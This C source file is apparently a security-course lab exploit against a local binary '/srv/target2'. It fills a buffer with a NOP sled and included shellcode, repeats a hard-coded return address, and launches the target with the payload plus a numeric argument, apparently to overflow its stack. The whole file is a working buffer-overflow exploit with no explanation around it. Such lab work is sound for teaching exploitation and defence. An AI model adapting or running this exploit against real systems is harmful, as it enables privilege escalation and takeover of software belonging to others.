#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target2"
const int BUF_SIZE = 409, OFFSET = 201;
const uint32_t RET_ADDR = 0xffffdb5c;

void fill(char *buffer) {
    for (int i = 0; i < BUF_SIZE - 1; ++i) {
        buffer[i] = (i < OFFSET || i >= OFFSET + sizeof(shellcode) - 1) ? 0x90 : shellcode[i - OFFSET];
    }
    uint32_t *ptr = (uint32_t *)(buffer + OFFSET + sizeof(shellcode) - 1);
    while ((char *)ptr < buffer + BUF_SIZE - 1) {
        *ptr++ = RET_ADDR;
    }
    buffer[BUF_SIZE - 1] = '\0';
}

int main(void) {
    char *args[4], *env[1], payload[BUF_SIZE];
    fill(payload);
    args[0] = TARGET;
    args[1] = payload;
    args[2] = "65935";
    args[3] = NULL;
    env[0] = NULL;
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    return 0;
}